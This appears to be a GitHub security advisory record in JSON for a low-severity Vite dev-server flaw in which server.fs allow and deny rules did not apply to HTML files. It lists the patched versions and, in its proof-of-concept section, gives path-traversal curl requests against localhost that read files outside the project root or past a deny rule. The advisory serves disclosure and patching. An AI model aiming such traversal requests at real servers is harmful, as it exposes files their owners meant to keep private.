{
  "Severity": "LOW",
  "UpdatedAt": "2025-09-09T20:54:43Z",
  "Package": {
    "Ecosystem": "NPM",
    "Name": "vite"
  },
  "Advisory": {
    "DatabaseId": 310860,
    "Id": "GSA_kwCzR0hTQS1qcWZ3LXZxMjQtdjljM84ABL5M",
    "GhsaId": "GHSA-jqfw-vq24-v9c3",
    "References": [
      {
        "Url": "https://github.com/vitejs/vite/security/advisories/GHSA-jqfw-vq24-v9c3"
      },
      {
        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2025-58752"
      },
      {
        "Url": "https://github.com/vitejs/vite/commit/0ab19ea9fcb66f544328f442cf6e70f7c0528d5f"
      },
      {
        "Url": "https://github.com/vitejs/vite/commit/14015d794f69accba68798bd0e15135bc51c9c1e"
      },
      {
        "Url": "https://github.com/vitejs/vite/commit/482000f57f56fe6ff2e905305100cfe03043ddea"
      },
      {
        "Url": "https://github.com/vitejs/vite/commit/6f01ff4fe072bcfcd4e2a84811772b818cd51fe6"
      },
      {
        "Url": "https://github.com/vitejs/vite/blob/v7.1.5/packages/vite/CHANGELOG.md"
      },
      {
        "Url": "https://github.com/advisories/GHSA-jqfw-vq24-v9c3"
      }
    ],
    "Identifiers": [
      {
        "Type": "GHSA",
        "Value": "GHSA-jqfw-vq24-v9c3"
      },
      {
        "Type": "CVE",
        "Value": "CVE-2025-58752"
      }
    ],
    "Description": "### Summary\nAny HTML files on the machine were served regardless of the `server.fs` settings.\n\n### Impact\n\nOnly apps that match the following conditions are affected:\n\n- explicitly exposes the Vite dev server to the network (using --host or [server.host config option](https://vitejs.dev/config/server-options.html#server-host))\n- `appType: 'spa'` (default) or `appType: 'mpa'` is used\n\nThis vulnerability also affects the preview server. The preview server allowed HTML files not under the output directory to be served.\n\n### Details\nThe [serveStaticMiddleware](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L123) function is in charge of serving static files from the server. It returns the [viteServeStaticMiddleware](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L136) function which runs the needed tests and serves the page. The viteServeStaticMiddleware function [checks if the extension of the requested file is \".html\"](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L144). If so, it doesn't serve the page. Instead, the server will go on to the next middlewares, in this case [htmlFallbackMiddleware](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/htmlFallback.ts#L14), and then to [indexHtmlMiddleware](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/indexHtml.ts#L438). These middlewares don't perform any test against allow or deny rules, and they don't make sure that the accessed file is in the root directory of the server. They just find the file and send back its contents to the client.\n\n### PoC\nExecute the following shell commands:\n\n```\nnpm  create  vite@latest\ncd vite-project/\necho  \"secret\" \u003e /tmp/secret.html\nnpm install\nnpm run dev\n```\n\nThen, in a different shell, run the following command:\n\n`curl  -v  --path-as-is  'http://localhost:5173/../../../../../../../../../../../tmp/secret.html'`\n\nThe contents of /tmp/secret.html will be returned.\n\nThis will also work for HTML files that are in the root directory of the project, but are in the deny list (or not in the allow list). Test that by stopping the running server (CTRL+C), and running the following commands in the server's shell:\n\n```\necho  'import path from \"node:path\"; import { defineConfig } from \"vite\"; export default defineConfig({server: {fs: {deny: [path.resolve(__dirname, \"secret_files/*\")]}}})'  \u003e  [vite.config.js](http://vite.config.js)\nmkdir secret_files\necho \"secret txt\" \u003e secret_files/secret.txt\necho \"secret html\" \u003e secret_files/secret.html\nnpm run dev\n\n```\n\nThen, in a different shell, run the following command:\n\n`curl  -v  --path-as-is  'http://localhost:5173/secret_files/secret.txt'`\n\nYou will receive a 403 HTTP Response,Â  because everything in the secret_files directory is denied.\n\nNow in the same shell run the following command:\n\n`curl  -v  --path-as-is  'http://localhost:5173/secret_files/secret.html'`\n\nYou will receive the contents of secret_files/secret.html.",
    "Origin": "UNSPECIFIED",
    "PublishedAt": "2025-09-09T20:54:42Z",
    "Severity": "LOW",
    "Summary": "Vite's `server.fs` settings were not applied to HTML files",
    "UpdatedAt": "2025-09-09T20:54:43Z",
    "WithdrawnAt": "",
    "CVSS": {
      "Score": 0,
      "VectorString": ""
    }
  },
  "Versions": [
    {
      "FirstPatchedVersion": {
        "Identifier": "5.4.20"
      },
      "VulnerableVersionRange": "\u003c= 5.4.19"
    },
    {
      "FirstPatchedVersion": {
        "Identifier": "6.3.6"
      },
      "VulnerableVersionRange": "\u003e= 6.0.0, \u003c= 6.3.5"
    },
    {
      "FirstPatchedVersion": {
        "Identifier": "7.0.7"
      },
      "VulnerableVersionRange": "\u003e= 7.0.0, \u003c= 7.0.6"
    },
    {
      "FirstPatchedVersion": {
        "Identifier": "7.1.5"
      },
      "VulnerableVersionRange": "\u003e= 7.1.0, \u003c= 7.1.4"
    }
  ]
}